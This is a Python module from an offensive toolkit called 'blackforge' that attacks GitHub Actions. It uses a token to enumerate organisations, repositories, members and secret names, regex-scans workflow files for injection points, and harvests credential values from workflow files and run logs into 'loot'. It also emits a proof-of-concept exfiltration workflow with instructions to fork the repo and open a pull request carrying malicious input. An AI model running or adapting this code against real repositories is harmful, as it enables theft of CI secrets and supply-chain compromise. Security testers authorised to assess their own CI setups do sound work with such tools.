"""GitHub Actions exploitation: token validation, org/repo enumeration,
workflow injection detection, Actions log secret scanning."""

from __future__ import annotations

import re
from typing import Any, Dict, List

from blackforge.config import GITHUB_API
from blackforge.logger import log
from blackforge.models import AttackResult, Credential, EngagementContext
from blackforge.modules.base import BaseModule
from blackforge.utils.http import request
from blackforge.utils.secrets import scan_secrets
from blackforge.data.payloads import GITHUB_EXFIL_WORKFLOW


class GitHubModule(BaseModule):

    name = "github"

    def run(self, ctx: EngagementContext, **kwargs: Any) -> List[AttackResult]:
        token: str = kwargs.get("token", "")
        org: str = kwargs.get("org", "")
        repo: str = kwargs.get("repo", "")

        results: List[AttackResult] = []
        hdrs: Dict[str, str] = (
            {"Authorization": f"token {token}", "Accept": "application/vnd.github.v3+json"}
            if token else {}
        )
        ctx.loot.setdefault("github", {})

        results.extend(self._verify_token(ctx, hdrs))
        if org:
            results.extend(self._enum_org(ctx, hdrs, org))
        if repo:
            results.extend(self._enum_repo(ctx, hdrs, repo))
            results.extend(self._enum_actions(ctx, hdrs, repo))
            results.extend(self._scan_workflow_files(ctx, hdrs, repo))
            results.extend(self._enum_actions_logs(ctx, hdrs, repo))
            results.extend(self._gen_inject_poc(ctx, repo))
        results.extend(self._check_secret_scanning(ctx, hdrs, org or repo))
        return results

    def _verify_token(self, ctx: EngagementContext, hdrs: Dict[str, str]) -> List[AttackResult]:
        if not hdrs:
            return []
        resp = request(ctx, "GET", f"{GITHUB_API}/user", headers=hdrs)
        if resp and resp.status_code == 200:
            data = resp.json()
            scopes = resp.headers.get("X-OAuth-Scopes", "")
            log(f"[GitHub] Token valid: {data.get('login')} | Scopes: {scopes}", "OK")
            ctx.loot["github"]["identity"] = {
                "login": data.get("login"),
                "id": data.get("id"),
                "scopes": scopes,
                "type": data.get("type"),
            }
            return [AttackResult(
                "github", "token_verify", "SUCCESS",
                data=ctx.loot["github"]["identity"],
                severity="INFO",
                notes=f"Authenticated as {data.get('login')} | Scopes: {scopes}",
            )]
        return []

    def _enum_org(self, ctx: EngagementContext, hdrs: Dict[str, str],
                  org: str) -> List[AttackResult]:
        resp = request(ctx, "GET", f"{GITHUB_API}/orgs/{org}/repos?per_page=100&type=all", headers=hdrs)
        if not resp or resp.status_code != 200:
            return []
        repos = resp.json()
        ctx.loot["github"]["repos"] = [
            {"name": r["name"], "private": r["private"], "default_branch": r["default_branch"]}
            for r in repos
        ]
        log(f"[GitHub] {org}: {len(repos)} repos ({sum(1 for r in repos if r['private'])} private)", "INFO")

        resp_m = request(ctx, "GET", f"{GITHUB_API}/orgs/{org}/members?per_page=100", headers=hdrs)
        members = resp_m.json() if resp_m and resp_m.ok else []
        ctx.loot["github"]["members"] = [m["login"] for m in members]

        resp_s = request(ctx, "GET", f"{GITHUB_API}/orgs/{org}/actions/secrets", headers=hdrs)
        org_secrets: List[str] = []
        if resp_s and resp_s.ok:
            org_secrets = [s["name"] for s in resp_s.json().get("secrets", [])]
            log(f"[GitHub] Org secrets (names): {org_secrets}", "WARN")

        ctx.loot["github"]["org_secrets"] = org_secrets
        return [AttackResult(
            "github", "org_enum", "SUCCESS", target=org,
            data={"repos": len(repos), "members": len(members), "org_secrets": org_secrets},
            severity="HIGH" if org_secrets else "INFO",
            notes=f"{org}: {len(repos)} repos, {len(members)} members, "
                  f"{len(org_secrets)} org-level secrets (names only visible)",
        )]

    def _enum_repo(self, ctx: EngagementContext, hdrs: Dict[str, str],
                   repo: str) -> List[AttackResult]:
        resp = request(ctx, "GET", f"{GITHUB_API}/repos/{repo}", headers=hdrs)
        if not resp or not resp.ok:
            return []
        info = resp.json()
        ctx.loot["github"]["repo_info"] = {
            "name": info.get("full_name"),
            "private": info.get("private"),
            "default_branch": info.get("default_branch"),
        }
        resp_s = request(ctx, "GET", f"{GITHUB_API}/repos/{repo}/actions/secrets", headers=hdrs)
        repo_secrets: List[str] = []
        if resp_s and resp_s.ok:
            repo_secrets = [s["name"] for s in resp_s.json().get("secrets", [])]
            log(f"[GitHub] Repo secrets ({repo}): {repo_secrets}", "WARN")
        ctx.loot["github"]["repo_secrets"] = repo_secrets
        return [AttackResult(
            "github", "repo_secrets", "SUCCESS", target=repo,
            data={"secrets": repo_secrets},
            severity="HIGH" if repo_secrets else "INFO",
            notes=f"Repo has {len(repo_secrets)} secrets. Names: {repo_secrets}.",
        )]

    def _enum_actions(self, ctx: EngagementContext, hdrs: Dict[str, str],
                      repo: str) -> List[AttackResult]:
        resp = request(ctx, "GET", f"{GITHUB_API}/repos/{repo}/actions/workflows", headers=hdrs)
        if not resp or not resp.ok:
            return []
        workflows = resp.json().get("workflows", [])
        ctx.loot["github"]["workflows"] = [
            {"name": w["name"], "path": w["path"], "state": w["state"]}
            for w in workflows
        ]
        log(f"[GitHub] {len(workflows)} workflows in {repo}", "INFO")
        return [AttackResult(
            "github", "workflows_enum", "INFO", target=repo,
            data={"count": len(workflows), "workflows": ctx.loot["github"]["workflows"]},
            notes=f"{len(workflows)} GitHub Actions workflows.",
        )]

    def _scan_workflow_files(self, ctx: EngagementContext, hdrs: Dict[str, str],
                             repo: str) -> List[AttackResult]:
        results: List[AttackResult] = []
        resp = request(ctx, "GET", f"{GITHUB_API}/repos/{repo}/contents/.github/workflows", headers=hdrs)
        if not resp or not resp.ok:
            return []
        files = resp.json() if isinstance(resp.json(), list) else []
        injection_findings: List[Dict[str, str]] = []

        inject_patterns = [
            (r"\$\{\{\s*github\.event\.", "github.event user input injection"),
            (r"\$\{\{\s*github\.head_ref", "github.head_ref branch name injection"),
            (r"\$\{\{\s*github\.event\.pull_request\.title", "PR title injection"),
            (r"run:\s*.*\$\{\{\s*github\.event", "Direct injection in run: step"),
        ]

        for f in files:
            if not f["name"].endswith((".yml", ".yaml")):
                continue
            file_resp = request(ctx, "GET", f["download_url"], headers=hdrs)
            if not file_resp or not file_resp.ok:
                continue
            content = file_resp.text

            for pattern, desc in inject_patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    injection_findings.append({"file": f["name"], "desc": desc})
                    log(f"[GitHub] Workflow injection: {f['name']} — {desc}", "CRIT")

            for s in scan_secrets(content):
                log(f"[GitHub] Secret in workflow: {f['name']} — {s['type']}", "CRIT")
                ctx.credentials.append(Credential(
                    s["type"], {"value": s["value"]},
                    f"github:workflow:{repo}/{f['name']}",
                    f"Hardcoded {s['type']} in workflow file",
                ))

        if injection_findings:
            ctx.loot["github"]["workflow_injections"] = injection_findings
            results.append(AttackResult(
                "github", "workflow_injection", "SUCCESS", target=repo,
                severity="CRITICAL", data=injection_findings,
                notes=f"{len(injection_findings)} workflow injection vectors found.",
            ))
        return results

    def _enum_actions_logs(self, ctx: EngagementContext, hdrs: Dict[str, str],
                           repo: str) -> List[AttackResult]:
        resp = request(ctx, "GET", f"{GITHUB_API}/repos/{repo}/actions/runs?per_page=10", headers=hdrs)
        if not resp or not resp.ok:
            return []
        runs = resp.json().get("workflow_runs", [])
        log_secrets: List[Dict[str, Any]] = []

        for run in runs[:5]:
            run_id = run["id"]
            log_resp = request(ctx, "GET", f"{GITHUB_API}/repos/{repo}/actions/runs/{run_id}/logs", headers=hdrs)
            if not log_resp:
                continue
            text = log_resp.text[:50000] if log_resp.status_code == 200 else ""
            if log_resp.status_code == 302:
                redirect = request(ctx, "GET", log_resp.headers.get("Location", ""), headers=hdrs)
                text = redirect.text[:50000] if redirect and redirect.ok else ""
            for s in scan_secrets(text):
                log_secrets.append({"run_id": run_id, **s})
                log(f"[GitHub] Secret in run log #{run_id}: {s['type']}", "CRIT")
                ctx.credentials.append(Credential(
                    s["type"], {"value": s["value"]},
                    f"github:actions_log:{repo}#{run_id}",
                ))

        return [AttackResult(
            "github", "log_secret_scan",
            "SUCCESS" if log_secrets else "INFO",
            target=repo,
            severity="CRITICAL" if log_secrets else "INFO",
            data={"secrets_found": log_secrets},
            notes=f"Scanned {len(runs)} run logs. {len(log_secrets)} secrets found.",
        )]

    def _gen_inject_poc(self, ctx: EngagementContext, repo: str) -> List[AttackResult]:
        return [AttackResult(
            "github", "workflow_inject_poc", "PARTIAL", target=repo,
            data={"poc": GITHUB_EXFIL_WORKFLOW[:200]},
            severity="HIGH",
            notes="PoC workflow generated. Fork repo, create PR with malicious input.",
        )]

    def _check_secret_scanning(self, ctx: EngagementContext, hdrs: Dict[str, str],
                               scope: str) -> List[AttackResult]:
        if not scope or not hdrs:
            return []
        resp = request(
            ctx, "GET",
            f"{GITHUB_API}/repos/{scope}/secret-scanning/alerts?state=open",
            headers=hdrs,
        )
        if resp and resp.ok:
            alerts = resp.json() if isinstance(resp.json(), list) else []
            if alerts:
                log(f"[GitHub] {len(alerts)} open secret scanning alerts!", "CRIT")
                return [AttackResult(
                    "github", "secret_scanning_alerts", "SUCCESS",
                    target=scope, severity="CRITICAL",
                    data={"count": len(alerts)},
                    notes=f"{len(alerts)} exposed secrets detected by GitHub Secret Scanning",
                )]
        return []
